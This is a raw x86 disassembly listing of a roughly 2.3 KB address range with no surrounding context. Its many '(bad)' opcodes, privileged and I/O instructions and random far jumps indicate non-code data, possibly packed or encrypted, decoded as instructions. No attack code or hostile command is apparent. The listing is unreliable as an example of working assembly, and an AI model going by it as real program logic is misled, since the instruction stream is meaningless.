  41e627:	js     0x41e69a
  41e629:	aad    0xb7
  41e62b:	ss push eax
  41e62d:	mov    gs,WORD PTR [edx+0x53]
  41e630:	xor    bl,bl
  41e632:	sub    ebp,ecx
  41e634:	jns    0x41e663
  41e636:	arpl   WORD PTR [ebp+0x3f],bp
  41e639:	nop
  41e63a:	and    cl,dh
  41e63c:	(bad)  
  41e63d:	in     al,0xed
  41e63f:	push   cs
  41e640:	imul   BYTE PTR [esi-0x3c]
  41e643:	sti    
  41e644:	adc    DWORD PTR [eax+eiz*8+0x5c],0xce4fa854
  41e64c:	cmp    BYTE PTR [ebx+0x2b6e2e9a],al
  41e652:	mov    ch,0x8
  41e654:	or     BYTE PTR [esi+edi*1-0x12],cl
  41e658:	mov    ebp,DWORD PTR ds:0x2329d351
  41e65e:	cmp    bl,dh
  41e660:	sub    ch,BYTE PTR es:[edx-0x48f4e902]
  41e667:	les    esp,FWORD PTR [edi-0x26]
  41e66a:	hlt    
  41e66b:	push   cs
  41e66c:	adc    ch,dl
  41e66e:	mov    eax,ds:0x4fc815fd
  41e673:	imul   eax,DWORD PTR [edx-0x46],0x30004cdc
  41e67a:	push   eax
  41e67b:	test   al,0xc3
  41e67d:	mov    ?,eax
  41e67f:	fld    st(7)
  41e681:	outs   dx,BYTE PTR ds:[esi]
  41e682:	out    0x35,al
  41e684:	pop    edx
  41e685:	test   DWORD PTR [ecx],eax
  41e687:	jne    0x41e6b0
  41e689:	ins    DWORD PTR es:[edi],dx
  41e68a:	sub    BYTE PTR [ecx+0xcb1eea6],bl
  41e690:	sbb    DWORD PTR [ecx],esp
  41e692:	xor    DWORD PTR [ecx-0x4e],edx
  41e695:	sub    edx,DWORD PTR [ebx]
  41e697:	or     ch,BYTE PTR [ecx-0x54f3e4cc]
  41e69d:	push   esi
  41e69e:	out    0x41,al
  41e6a0:	push   esi
  41e6a1:	test   al,0x89
  41e6a3:	fwait
  41e6a4:	push   0x21
  41e6a6:	out    dx,eax
  41e6a7:	test   al,0x8f
  41e6a9:	jmp    0x41e661
  41e6ab:	into   
  41e6ac:	jns    0x41e6b6
  41e6ae:	data16 shr BYTE PTR [ecx+0x39],0xde
  41e6b3:	das    
  41e6b4:	jo     0x41e638
  41e6b6:	inc    edi
  41e6b7:	jg     0x41e67c
  41e6b9:	gs xor dl,cl
  41e6bc:	xchg   edi,eax
  41e6bd:	xchg   esp,eax
  41e6be:	fistp  QWORD PTR [edx]
  41e6c0:	or     BYTE PTR [ebp+0x69],dh
  41e6c3:	iret   
  41e6c4:	nop
  41e6c5:	je     0x41e744
  41e6c7:	jge    0x41e66e
  41e6c9:	cld    
  41e6ca:	sbb    BYTE PTR [ebx-0x76711922],ah
  41e6d0:	call   0x2b370de5
  41e6d5:	je     0x41e6ad
  41e6d7:	inc    ecx
  41e6d8:	and    bh,cl
  41e6da:	mov    ecx,0x91cd4d2d
  41e6df:	call   0xeb2f:0xe6008603
  41e6e6:	adc    DWORD PTR ds:0xe27e9657,esi
  41e6ec:	xor    eax,0xd5e4eb3a
  41e6f1:	(bad)  
  41e6f2:	xchg   edx,eax
  41e6f3:	add    DWORD PTR [edi],esi
  41e6f5:	dec    esi
  41e6f6:	retf   
  41e6f7:	cmp    al,0xa8
  41e6f9:	xor    DWORD PTR [eax-0x68b9916c],ebx
  41e6ff:	test   al,0x6a
  41e701:	adc    al,0x68
  41e703:	mov    es,ecx
  41e705:	inc    ebp
  41e706:	dec    ebx
  41e707:	xchg   esp,eax
  41e708:	or     DWORD PTR [ebx+0x7e],esp
  41e70b:	adc    al,0xd5
  41e70d:	push   edi
  41e70e:	jnp    0x41e75f
  41e710:	rcr    esp,0xf8
  41e713:	inc    esi
  41e714:	cmp    DWORD PTR [edx+0x10adae44],ebx
  41e71a:	sub    al,0xc5
  41e71c:	sbb    dl,BYTE PTR [edi+ebp*2-0x40]
  41e720:	mov    dh,BYTE PTR [edi+0x45119c4f]
  41e726:	pop    edx
  41e727:	mov    BYTE PTR [edi+ebx*2-0x10],al
  41e72b:	idiv   bl
  41e72d:	mov    edx,0xee382646
  41e732:	mov    dl,0x67
  41e734:	cld    
  41e735:	push   edi
  41e736:	xchg   esi,eax
  41e737:	aam    0x84
  41e739:	sbb    al,al
  41e73b:	int    0x45
  41e73d:	xchg   edi,eax
  41e73e:	scas   eax,DWORD PTR es:[edi]
  41e73f:	sbb    bh,bh
  41e741:	jp     0x41e722
  41e743:	dec    eax
  41e744:	pushf  
  41e745:	sub    eax,0x5eaff859
  41e74a:	adc    edi,DWORD PTR [ebp-0x1bee4e93]
  41e750:	scas   eax,DWORD PTR es:[edi]
  41e751:	call   0x9e1220ff
  41e756:	stc    
  41e757:	int3   
  41e758:	or     ah,bl
  41e75a:	or     edi,esi
  41e75c:	add    BYTE PTR fs:[edx],0x4
  41e760:	push   edx
  41e761:	sbb    cl,BYTE PTR [edi+eiz*2-0x6d]
  41e765:	mov    eax,0xad84c1f0
  41e76a:	add    DWORD PTR [ecx],ebx
  41e76c:	addr16 dec esi
  41e76e:	retf   0x6102
  41e771:	pop    ecx
  41e772:	push   ebx
  41e773:	add    BYTE PTR [eax-0x39],al
  41e776:	(bad)  
  41e777:	(bad)  
  41e779:	jbe    0x41e7be
  41e77b:	fsubr  QWORD PTR [edx-0x6]
  41e77e:	out    dx,al
  41e77f:	test   eax,0x3864bbf1
  41e784:	clc    
  41e785:	adc    ah,BYTE PTR [ebx+ecx*1]
  41e788:	fldcw  WORD PTR [ebp-0x31]
  41e78b:	out    dx,al
  41e78c:	call   0x1104f586
  41e791:	cli    
  41e792:	adc    ecx,DWORD PTR [edx-0x25]
  41e795:	adc    al,0x5a
  41e797:	stc    
  41e798:	repnz enter 0xb13,0xf3
  41e79d:	sbb    BYTE PTR [esi+0x75],0x1c
  41e7a1:	out    dx,al
  41e7a2:	dec    esp
  41e7a3:	mov    bh,0x9f
  41e7a5:	xchg   ecx,eax
  41e7a6:	sahf   
  41e7a7:	mov    esi,0xd1fbae29
  41e7ac:	jp     0x41e791
  41e7ae:	cmp    al,BYTE PTR [ebp+0x90b686f]
  41e7b4:	rcl    DWORD PTR [edi],0x6c
  41e7b7:	add    eax,0x3f345590
  41e7bc:	xor    edi,0xf2c54bd5
  41e7c2:	sub    DWORD PTR [ecx],esi
  41e7c4:	ins    DWORD PTR es:[edi],dx
  41e7c5:	jno    0x41e79d
  41e7c7:	dec    esp
  41e7c8:	ins    BYTE PTR es:[edi],dx
  41e7c9:	xchg   edx,eax
  41e7ca:	cmp    al,0x0
  41e7cc:	cmp    esi,esi
  41e7ce:	and    bh,ch
  41e7d0:	lods   eax,DWORD PTR ds:[esi]
  41e7d1:	retf   0xcc37
  41e7d4:	arpl   sp,bp
  41e7d6:	fnstcw WORD PTR [ebx+edx*4+0x60]
  41e7da:	and    al,0xf
  41e7dc:	jecxz  0x41e859
  41e7de:	idiv   esp
  41e7e0:	lss    eax,FWORD PTR [ebx+eiz*1]
  41e7e4:	dec    esp
  41e7e5:	xor    DWORD PTR [esi],0xfffffff9
  41e7e8:	and    bl,BYTE PTR [esi+0x47]
  41e7eb:	daa    
  41e7ec:	aad    0x8e
  41e7ee:	hlt    
  41e7ef:	(bad)  
  41e7f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7f1:	pop    edi
  41e7f2:	xor    al,dl
  41e7f4:	push   cs
  41e7f5:	jge    0x41e816
  41e7f7:	iret   
  41e7f8:	je     0x41e879
  41e7fa:	ins    DWORD PTR es:[edi],dx
  41e7fb:	push   edx
  41e7fc:	loope  0x41e7c9
  41e7fe:	and    eax,0x51ef7d04
  41e803:	jp     0x41e7d0
  41e805:	idiv   BYTE PTR [ecx]
  41e807:	xchg   ebp,eax
  41e808:	mov    ebp,0x69d3b059
  41e80d:	cmp    bh,ch
  41e80f:	jge    0x41e80c
  41e811:	or     ah,bl
  41e813:	loop   0x41e875
  41e815:	pusha  
  41e816:	mov    ebx,0x7348e5e4
  41e81b:	mov    bh,0xca
  41e81d:	fist   WORD PTR [edi]
  41e81f:	jmp    0xb5cf:0x987623a2
  41e826:	adc    al,bh
  41e828:	cmp    al,0xc7
  41e82a:	add    esp,DWORD PTR [esi+0xe4bd138]
  41e830:	scas   eax,DWORD PTR es:[edi]
  41e831:	enter  0x5fa6,0x93
  41e835:	hlt    
  41e836:	and    DWORD PTR [ebx+edx*4],edx
  41e839:	int3   
  41e83a:	push   ecx
  41e83b:	shl    BYTE PTR [ebx*4+0x40655d21],1
  41e842:	mov    eax,ds:0xb2931a40
  41e847:	aas    
  41e848:	dec    edi
  41e849:	ficom  DWORD PTR [ebx+0x62f1970f]
  41e84f:	add    bl,BYTE PTR [esi]
  41e851:	cli    
  41e852:	out    dx,al
  41e853:	loope  0x41e7f7
  41e855:	inc    al
  41e857:	cmp    ah,ah
  41e859:	jno    0x41e7dd
  41e85b:	pop    eax
  41e85c:	aad    0x69
  41e85e:	je     0x41e8dd
  41e860:	(bad)  
  41e861:	lea    edi,[edx+0x26]
  41e864:	xchg   ebp,eax
  41e865:	ret    0xefae
  41e868:	in     eax,0xaf
  41e86a:	adc    cl,BYTE PTR [ebx+0x236f06b8]
  41e870:	ins    DWORD PTR es:[edi],dx
  41e871:	sbb    eax,0x526f6a73
  41e876:	jo     0x41e8c1
  41e878:	lock (bad) 
  41e87a:	cs mov ch,dh
  41e87d:	std    
  41e87e:	addr16 xchg ecx,eax
  41e880:	xchg   edx,eax
  41e881:	outs   dx,BYTE PTR ds:[esi]
  41e882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e883:	int    0xb5
  41e885:	inc    esp
  41e887:	pop    es
  41e888:	shl    DWORD PTR [ebx-0x33792bfe],1
  41e88e:	ret    0x6d40
  41e891:	stos   BYTE PTR es:[edi],al
  41e892:	xor    al,0x5f
  41e894:	xor    bl,BYTE PTR [ebp-0x13]
  41e897:	adc    DWORD PTR [ebx],ebx
  41e899:	pop    esp
  41e89a:	out    dx,al
  41e89b:	push   ss
  41e89c:	mov    edi,0xcb9455e3
  41e8a1:	(bad)  
  41e8a2:	mov    ebx,0xc91c13e9
  41e8a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8a8:	ja     0x41e8c7
  41e8aa:	or     dh,BYTE PTR [edx+0x5253c558]
  41e8b0:	pop    esi
  41e8b1:	jmp    0x60a5:0xee4f3d81
  41e8b8:	push   ebp
  41e8b9:	dec    ebx
  41e8ba:	xor    DWORD PTR [eax-0x55fff45e],esi
  41e8c0:	test   DWORD PTR es:[edi+0x47],ecx
  41e8c4:	sub    esi,DWORD PTR [edx+eiz*1+0x38]
  41e8c8:	call   0x5bbe8d7e
  41e8cd:	pop    ebx
  41e8ce:	cs fwait
  41e8d0:	mov    eax,ds:0x817fe2a5
  41e8d5:	mov    cl,0x80
  41e8d7:	or     ebx,edx
  41e8d9:	punpckldq mm4,DWORD PTR [ebx+ecx*1-0x54]
  41e8de:	cmp    al,BYTE PTR [eax+eiz*2-0x16]
  41e8e2:	sbb    BYTE PTR [eax-0x72c51907],bl
  41e8e8:	test   al,0x41
  41e8ea:	ds pop di
  41e8ed:	mov    dh,0xad
  41e8ef:	mov    cl,0xd5
  41e8f1:	xchg   ecx,eax
  41e8f2:	adc    dl,BYTE PTR [ebx+0x286ee270]
  41e8f8:	ins    BYTE PTR es:[edi],dx
  41e8f9:	pop    esi
  41e8fa:	call   FWORD PTR [edx+edx*4-0x597def5d]
  41e901:	shr    DWORD PTR [ebp-0x17f18741],cl
  41e907:	fdivr  DWORD PTR [edi-0x41]
  41e90a:	add    bl,BYTE PTR [edx+edi*1-0x48]
  41e90e:	ins    BYTE PTR es:[edi],dx
  41e90f:	loop   0x41e977
  41e911:	inc    esp
  41e912:	push   es
  41e913:	mov    ds:0x6b5f40cf,al
  41e918:	icebp  
  41e919:	outs   dx,DWORD PTR ds:[esi]
  41e91a:	fdiv   QWORD PTR [eax+0x67]
  41e91d:	adc    al,0xf2
  41e91f:	mov    ebp,0x1b81dd8d
  41e924:	sub    al,0x20
  41e926:	and    ah,BYTE PTR [ebx-0x11]
  41e929:	cmc    
  41e92a:	mov    dl,0x5a
  41e92c:	popa   
  41e92d:	fcomp  QWORD PTR [esi]
  41e92f:	jb     0x41e975
  41e931:	cs dec ebx
  41e933:	dec    edi
  41e934:	inc    ebx
  41e935:	mov    esi,0xd6e99062
  41e93a:	adc    DWORD PTR [ebx-0x6c],0x9
  41e93e:	repz addr16 sahf 
  41e941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e942:	xor    bl,BYTE PTR [ebp+ecx*8-0x4d6cbfdf]
  41e949:	mov    bh,0xd6
  41e94b:	fld    TBYTE PTR [esi+ebx*8-0x12]
  41e94f:	fbld   TBYTE PTR [ebx-0x5f31be92]
  41e955:	es scas al,BYTE PTR es:[edi]
  41e957:	outs   dx,DWORD PTR ds:[esi]
  41e958:	push   ecx
  41e959:	inc    edx
  41e95a:	das    
  41e95b:	stos   BYTE PTR es:[edi],al
  41e95c:	les    esp,FWORD PTR [eax]
  41e95e:	cmp    bh,BYTE PTR [esi+0x7ce0053b]
  41e964:	or     eax,0x6344fecf
  41e969:	jmp    0x41e9dd
  41e96b:	sbb    bl,BYTE PTR [edx+0x46]
  41e96e:	dec    esp
  41e96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e970:	(bad)  
  41e972:	mov    DWORD PTR [ecx],edi
  41e974:	ffree  st(3)
  41e976:	or     ebx,DWORD PTR [eax]
  41e978:	out    dx,eax
  41e979:	sbb    BYTE PTR [edx-0x5c],bl
  41e97c:	add    BYTE PTR [esi+eax*1-0x2b3fd2d2],bl
  41e983:	or     eax,0xece48130
  41e988:	jl     0x41e9f9
  41e98a:	inc    DWORD PTR [eax]
  41e98c:	sub    esp,DWORD PTR [ecx+0x24]
  41e98f:	out    dx,eax
  41e990:	shl    edi,0x56
  41e993:	push   ebx
  41e994:	les    esi,FWORD PTR [edi]
  41e996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e997:	push   edx
  41e998:	push   0x1b
  41e99a:	jo     0x41e98a
  41e99c:	add    al,0x7d
  41e99e:	jnp    0x41e96b
  41e9a0:	loop   0x41e93c
  41e9a2:	lods   eax,DWORD PTR ds:[esi]
  41e9a3:	cmp    edi,ebp
  41e9a5:	cwde   
  41e9a6:	test   eax,0x5f6f5367
  41e9ab:	(bad)  
  41e9ac:	hlt    
  41e9ad:	inc    ebp
  41e9ae:	mov    DWORD PTR [esi-0x7e],0xf54f81bb
  41e9b5:	xchg   ecx,eax
  41e9b6:	xor    eax,0x1af5021a
  41e9bb:	dec    ecx
  41e9bc:	repnz mov ds:0x8726cac7,al
  41e9c2:	retf   
  41e9c3:	int3   
  41e9c4:	outs   dx,BYTE PTR ds:[esi]
  41e9c5:	and    DWORD PTR [ecx-0x53ccc80f],0x1326ebaf
  41e9cf:	pop    eax
  41e9d0:	inc    edx
  41e9d1:	(bad)  
  41e9d3:	xchg   ecx,eax
  41e9d4:	or     dh,BYTE PTR [eax]
  41e9d6:	xchg   BYTE PTR [ebp+esi*4-0x2b3dc200],ch
  41e9dd:	mov    eax,ds:0x7ef948cf
  41e9e2:	dec    ebp
  41e9e3:	dec    eax
  41e9e4:	fidiv  DWORD PTR [eax-0x18629579]
  41e9ea:	inc    esp
  41e9eb:	shl    BYTE PTR [esi],0x25
  41e9ee:	sbb    eax,0x2ebb630a
  41e9f3:	retf   0x32ab
  41e9f6:	fwait
  41e9f7:	dec    ebx
  41e9f8:	jnp    0x41ea3d
  41e9fa:	int3   
  41e9fb:	call   0x16e:0x751ef73e
  41ea02:	pop    es
  41ea03:	push   edx
  41ea04:	pop    ss
  41ea05:	push   ss
  41ea06:	sbb    ah,al
  41ea08:	ja     0x41ea27
  41ea0a:	loop   0x41ea4b
  41ea0c:	int    0x60
  41ea0e:	xor    BYTE PTR [esi-0xd8428c6],cl
  41ea14:	cmc    
  41ea15:	loop   0x41e9e1
  41ea17:	les    ebp,FWORD PTR [ebp-0x4f]
  41ea1a:	add    edx,DWORD PTR ds:0x5204873a
  41ea20:	mov    ah,ch
  41ea22:	nop
  41ea23:	xor    al,0x4c
  41ea25:	lds    esp,FWORD PTR [edx+edi*8]
  41ea28:	xchg   esp,eax
  41ea29:	nop
  41ea2a:	mov    ah,BYTE PTR [ecx+0x64]
  41ea2d:	xchg   ebx,eax
  41ea2e:	shr    BYTE PTR [edi+0x54a9e9f0],1
  41ea34:	inc    eax
  41ea35:	adc    DWORD PTR [edx],esp
  41ea37:	iret   
  41ea38:	xrelease mov DWORD PTR [edi+0x3632902b],edx
  41ea3f:	push   ebp
  41ea40:	and    eax,0x2610b9f0
  41ea45:	aad    0x47
  41ea47:	add    BYTE PTR [edx],bl
  41ea49:	inc    edx
  41ea4a:	pop    ebx
  41ea4b:	lock dec ebx
  41ea4d:	push   ds
  41ea4e:	xor    DWORD PTR [edx+0x38edf94c],0x42
  41ea55:	mov    esp,0x1dfdb08d
  41ea5a:	pop    ecx
  41ea5b:	retf   
  41ea5c:	fidivr WORD PTR [edi]
  41ea5e:	fsubp  st(7),st
  41ea60:	cmp    eax,0xf474054
  41ea65:	adc    DWORD PTR [ebx-0x4cdb7f0f],edx
  41ea6b:	mov    eax,ds:0xd7f857de
  41ea70:	mov    ebx,0x16563557
  41ea75:	jnp    0x41ea12
  41ea77:	inc    edx
  41ea78:	and    esi,DWORD PTR [edi+0x75]
  41ea7b:	push   edx
  41ea7c:	stos   BYTE PTR es:[edi],al
  41ea7d:	dec    ebp
  41ea7e:	fisttp DWORD PTR [ecx+0x212d4ec0]
  41ea84:	or     DWORD PTR [ebx],eax
  41ea86:	(bad)  
  41ea87:	imul   ebx,esi,0x99e3f07a
  41ea8d:	fst    DWORD PTR [eax-0x7d]
  41ea90:	outs   dx,BYTE PTR ds:[esi]
  41ea91:	xchg   edx,eax
  41ea92:	js     0x41eade
  41ea94:	jnp    0x41eaac
  41ea96:	dec    edi
  41ea97:	adc    al,0x0
	...
  41ec61:	add    BYTE PTR [eax],al
  41ec63:	add    BYTE PTR [eax],ah
  41ec65:	lahf   
  41ec66:	arpl   WORD PTR [ebp-0x40110201],cx
  41ec6c:	mov    gs,WORD PTR [ebx-0x64d6bf00]
  41ec72:	jl     0x41ebf6
  41ec74:	pop    ebp
  41ec75:	inc    ebp
  41ec76:	add    DWORD PTR [eax],eax
  41ec78:	and    al,BYTE PTR [edi]
  41ec7a:	add    BYTE PTR [eax],al
  41ec7c:	test   al,0xc9
  41ec7e:	cli    
  41ec7f:	adc    DWORD PTR [esi+ecx*4-0x39792af8],esi
  41ec86:	enter  0x37c6,0xd0
  41ec8a:	pop    ss
  41ec8b:	aaa    
  41ec8c:	lods   eax,DWORD PTR ds:[esi]
  41ec8d:	fimul  WORD PTR [ebp+0x6091915a]
  41ec93:	mov    bl,0x77
  41ec95:	adc    esi,DWORD PTR [eax+0x51]
  41ec98:	push   ds
  41ec99:	lods   al,BYTE PTR ds:[esi]
  41ec9a:	clc    
  41ec9b:	or     DWORD PTR [edx+edx*2+0x5],edx
  41ec9f:	sub    bl,BYTE PTR fs:[eax+0x79]
  41eca3:	jb     0x41ecac
  41eca5:	xor    DWORD PTR [ecx-0x6c541dee],ebp
  41ecab:	xor    esi,DWORD PTR [eax-0x53e52a74]
  41ecb1:	rcl    bh,0x81
  41ecb4:	jp     0x41ec5c
  41ecb6:	call   0x434f:0x307053a
  41ecbd:	aas    
  41ecbe:	push   esi
  41ecbf:	xchg   edi,eax
  41ecc0:	or     eax,0x2c1533dd
  41ecc5:	fcmovnbe st,st(2)
  41ecc7:	je     0x41ec58
  41ecc9:	xchg   ecx,eax
  41ecca:	dec    esi
  41eccb:	je     0x41ec73
  41eccd:	sub    dh,BYTE PTR [edi]
  41eccf:	aas    
  41ecd0:	mov    esp,0x636d1575
  41ecd5:	inc    ebp
  41ecd6:	imul   ebp,DWORD PTR [edx],0xfffffff2
  41ecd9:	mov    edx,0x8510b7c2
  41ecde:	inc    esi
  41ecdf:	xor    al,0x67
  41ece1:	mov    ecx,0x2e4ff8f6
  41ece6:	fcmovu st,st(2)
  41ece8:	mov    dl,0xf8
  41ecea:	les    ebp,FWORD PTR [eax+0x6562380b]
  41ecf0:	in     al,0x37
  41ecf2:	iret   
  41ecf3:	xchg   ebx,eax
  41ecf4:	loope  0x41ed4b
  41ecf6:	test   al,0x25
  41ecf8:	xlat   BYTE PTR ds:[ebx]
  41ecf9:	dec    esi
  41ecfa:	ins    DWORD PTR es:[edi],dx
  41ecfb:	shl    DWORD PTR ds:0xd6a6a98e,1
  41ed01:	jecxz  0x41ed4e
  41ed03:	or     eax,0x6e3fa385
  41ed08:	popf   
  41ed09:	inc    ebx
  41ed0a:	(bad)  [ecx+eiz*4]
  41ed0d:	dec    esp
  41ed0e:	jmp    0xa004:0xc8278e89
  41ed15:	push   esi
  41ed16:	jbe    0x41eca3
  41ed18:	dec    eax
  41ed19:	sti    
  41ed1a:	sbb    al,dh
  41ed1c:	std    
  41ed1d:	xchg   edx,eax
  41ed1e:	jbe    0x41ece5
  41ed20:	out    dx,al
  41ed21:	test   ebp,ebp
  41ed23:	dec    ebx
  41ed24:	adc    al,0x90
  41ed26:	adc    eax,0x1c2563af
  41ed2b:	cmp    ebp,ecx
  41ed2d:	lods   al,BYTE PTR ds:[esi]
  41ed2e:	pop    edi
  41ed2f:	(bad)  
  41ed31:	mov    ds:0xcb1ad37d,al
  41ed36:	xlat   BYTE PTR ds:[ebx]
  41ed37:	rcr    dl,1
  41ed39:	mov    al,ds:0xca9187eb
  41ed3e:	(bad)  
  41ed3f:	out    0x83,eax
  41ed41:	mov    ch,0xda
  41ed43:	xchg   esi,eax
  41ed44:	mov    ds:0xb060a17c,eax
  41ed49:	fs ins DWORD PTR es:[edi],dx
  41ed4b:	leave  
  41ed4c:	jp     0x41ecfc
  41ed4e:	rcl    BYTE PTR [esp+ebp*8-0x47cb0b2],0x34
  41ed56:	push   ebp
  41ed57:	xor    eax,0x7ddda3e6
  41ed5c:	pusha  
  41ed5d:	les    edi,FWORD PTR [edi+0x4074beb]
  41ed63:	add    eax,esp
  41ed65:	jmp    0x2d48949f
  41ed6a:	imul   ebx,DWORD PTR [ecx-0x290583e6],0x58a6dcec
  41ed74:	dec    ebp
  41ed75:	arpl   WORD PTR [edx-0x50],di
  41ed78:	xchg   esi,ecx
  41ed7a:	jnp    0x41ed9c
  41ed7c:	nop
  41ed7d:	or     eax,0xd7d468d5
  41ed82:	das    
  41ed83:	imul   eax,DWORD PTR [edx-0x6f870f55],0xd
  41ed8a:	fimul  WORD PTR [ecx-0x3d]
  41ed8d:	cli    
  41ed8e:	inc    ebx
  41ed8f:	adc    ebx,DWORD PTR [edi]
  41ed91:	popf   
  41ed92:	sbb    eax,0x44d7b600
  41ed97:	dec    edx
  41ed98:	pop    es
  41ed99:	lods   eax,DWORD PTR ds:[esi]
  41ed9a:	mov    edx,0x71c17bbb
  41ed9f:	(bad)  
  41eda0:	mov    ebx,0x555696f0
  41eda5:	inc    ecx
  41eda6:	into   
  41eda7:	ja     0x41edf7
  41eda9:	gs push esi
  41edab:	mov    ss,WORD PTR [esi]
  41edad:	cmp    bl,ah
  41edaf:	int    0xb0
  41edb1:	jle    0x41ed93
  41edb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edb4:	mov    al,0x68
  41edb6:	fs cmp eax,0xb948408f
  41edbc:	xlat   BYTE PTR ds:[ebx]
  41edbd:	aas    
  41edbe:	dec    esi
  41edbf:	inc    ecx
  41edc0:	or     ebx,DWORD PTR [esp+0x16e05956]
  41edc7:	mov    ds:0x3c6410d3,eax
  41edcc:	add    eax,DWORD PTR [ebp-0x80]
  41edcf:	shr    BYTE PTR [edx],cl
  41edd1:	loope  0x41ede7
  41edd3:	mov    WORD PTR [edi-0x1e],?
  41edd6:	in     al,dx
  41edd7:	sbb    dh,cl
  41edd9:	enter  0x828c,0xb5
  41eddd:	sbb    al,0x2c
  41eddf:	scas   al,BYTE PTR es:[edi]
  41ede0:	cmp    eax,0x1a0f110c
  41ede5:	loop   0x41ee57
  41ede7:	pop    ds
  41ede8:	jl     0x41ee58
  41edea:	ret    0x9f86
  41eded:	xchg   DWORD PTR [ebp+ebp*1+0x5a],ebp
  41edf1:	daa    
  41edf2:	dec    edx
  41edf3:	sub    ebx,ebx
  41edf5:	adc    cl,BYTE PTR [ebx+ecx*8+0x52]
  41edf9:	nop
  41edfa:	ret    0x3701
  41edfd:	inc    esp
  41edfe:	mov    eax,edi
  41ee00:	scas   eax,DWORD PTR es:[edi]
  41ee01:	xchg   esp,eax
  41ee02:	jp     0x41ee72
  41ee04:	aaa    
  41ee05:	adc    BYTE PTR [edx+ecx*1],cl
  41ee08:	mov    edi,0xe57ee286
  41ee0d:	aam    0x7d
  41ee0f:	pop    edi
  41ee10:	fisub  DWORD PTR [ebx-0x30ab8583]
  41ee16:	jmp    0x6db1:0xd5a39162
  41ee1d:	or     al,0x66
  41ee1f:	in     al,0xf
  41ee21:	loope  0x41ee2e
  41ee23:	mov    bh,dl
  41ee25:	imul   esi,DWORD PTR [ebx-0x113c49ce],0x88c23f9e
  41ee2f:	in     al,dx
  41ee30:	arpl   sp,bx
  41ee32:	aam    0xcc
  41ee34:	(bad)  
  41ee35:	pop    esp
  41ee36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee37:	enter  0x3e6c,0x20
  41ee3b:	out    dx,eax
  41ee3c:	push   ebx
  41ee3d:	cld    
  41ee3e:	lods   eax,DWORD PTR fs:[esi]
  41ee40:	cmp    bl,BYTE PTR [edx-0x7dfabfe]
  41ee46:	adc    BYTE PTR [esi-0x79],dh
  41ee49:	mov    esi,ebx
  41ee4b:	test   DWORD PTR [edx],ecx
  41ee4d:	xor    ah,BYTE PTR [esp+edi*8+0x28f46c79]
  41ee54:	aas    
  41ee55:	neg    edx
  41ee57:	push   ebx
  41ee58:	pop    edx
  41ee59:	daa    
  41ee5a:	pop    ecx
  41ee5b:	pop    eax
  41ee5c:	bound  edi,QWORD PTR [ebp-0x7f001c2d]
  41ee62:	dec    esp
  41ee63:	jle    0x41ee41
  41ee65:	jmp    0x41edee
  41ee67:	or     BYTE PTR [esi+0x3c],0x90
  41ee6b:	push   ds
  41ee6c:	or     eax,0xe5917d79
  41ee71:	push   es
  41ee72:	add    esi,eax
  41ee74:	lds    edi,FWORD PTR [ebx]
  41ee76:	mov    cl,BYTE PTR ss:[edx]
  41ee79:	mov    al,ds:0x76418e7
  41ee7e:	xchg   esp,eax
  41ee7f:	gs mov esp,0xdd0b0a84
  41ee85:	fld    DWORD PTR [esi]
  41ee87:	jo     0x41ee95
  41ee89:	test   BYTE PTR [ecx-0x1c],bh
  41ee8c:	imul   ebp,DWORD PTR [ebx+0x476bd8a1],0x6b283aba
  41ee96:	sbb    BYTE PTR [edi+0x301839d4],ch
  41ee9c:	stos   DWORD PTR es:[edi],eax
  41ee9d:	xor    DWORD PTR [esi-0x58],ebp
  41eea0:	sbb    eax,0xd78d7c67
  41eea5:	fstp   st(1)
  41eea7:	aad    0x63
  41eea9:	out    dx,al
  41eeaa:	jge    0x41ee68
  41eeac:	and    DWORD PTR [ebx-0x40],edi
  41eeaf:	sbb    BYTE PTR [ecx-0x35],cl
  41eeb2:	imul   esp,ebx,0x3c
  41eeb5:	pushf  
  41eeb6:	and    eax,0x2f7bf8c9
  41eebb:	(bad)  [edi+ebp*2-0x75]
  41eebf:	ret    0xb188
  41eec2:	call   0x69eff169
  41eec7:	adc    bh,BYTE PTR [ecx-0x36ddd317]
  41eecd:	mov    bh,0x99
  41eed0:	out    0x66,al
  41eed2:	and    dl,ah
  41eed4:	pop    eax
  41eed6:	sub    ah,cl
  41eed8:	sti    
  41eed9:	pop    edx
  41eeda:	dec    edx
  41eedb:	and    eax,0x4e086ca
  41eee0:	popf   
  41eee1:	adc    al,0x3c
  41eee3:	add    al,ch
  41eee5:	cmp    BYTE PTR [eax+0x55],bl
  41eee8:	push   0xffffffdb
  41eeea:	jmp    0xb86f:0x1ca362a0
  41eef1:	ret    0xde4a
  41eef4:	sbb    edx,ecx
  41eef6:	stos   DWORD PTR es:[edi],eax
  41eef7:	pop    esi
  41eef8:	jmp    0x41eed3
  41eefa:	scas   eax,DWORD PTR es:[edi]
  41eefb:	aas    
  41eefc:	sub    BYTE PTR [ebp+ebp*8-0x7c],bh
  41ef00:	add    eax,0x5954488
  41ef05:	fadd   st,st(5)
  41ef07:	lds    edx,FWORD PTR [edi+0x56]
  41ef0a:	(bad)  
  41ef0b:	ins    BYTE PTR es:[edi],dx
  41ef0c:	cmp    eax,0xafdb8456
  41ef11:	mov    bh,cl
  41ef13:	and    ch,BYTE PTR [eax]
  41ef15:	or     BYTE PTR [ebx],ah
  41ef17:	ja     0x41ef89
  41ef19:	push   ecx
  41ef1a:	(bad)  
  41ef1b:	mov    eax,0x22366c86
  41ef20:	adc    BYTE PTR [esp+ebp*8+0x66daeb57],dh
  41ef27:	(bad)  
  41ef28:	jecxz  0x41ef1f
  41ef2a:	and    eax,0xa3513cc6
  41ef2f:	aas    
  41ef30:	add    ah,bh
  41ef32:	jp     0x41eeb4
  41ef34:	sbb    ecx,DWORD PTR [ecx-0x26c08904]
  41ef3a:	push   ebx
  41ef3b:	sbb    eax,0xd707c8ed
  41ef40:	mov    edi,0xd6a28a19
  41ef45:	cmp    BYTE PTR [ecx],0xf1
  41ef48:	lods   al,BYTE PTR ds:[esi]
  41ef49:	rcl    DWORD PTR [edi],0xaa
  41ef4c:	and    BYTE PTR [esp+esi*1+0x664cf354],dl
  41ef53:	mov    al,ah
